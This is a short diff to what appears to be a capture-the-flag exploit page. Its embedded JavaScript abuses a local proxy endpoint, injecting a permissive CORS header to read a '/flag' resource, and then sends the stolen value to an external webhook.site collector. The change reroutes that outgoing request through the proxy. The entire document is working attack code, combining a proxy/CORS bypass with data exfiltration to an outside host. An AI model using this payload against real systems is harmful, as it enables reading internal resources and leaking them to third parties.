@@ -8,7 +8,7 @@
 fetch("http://localhost:8080/proxy?url=http://localhost:8080/flag&mirror=Access-Control-Allow-Origin:*")
 .then(r => r.text())
 .then(flag => {
-  fetch("https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/?flag=" + encodeURIComponent(flag));
+  fetch("http://localhost:8080/proxy?url=https://7332d1d2-cd75-48ac-a396-869e505e7dca.webhook.site/?flag=" + encodeURIComponent(flag));
 });
 </script>
 </body>
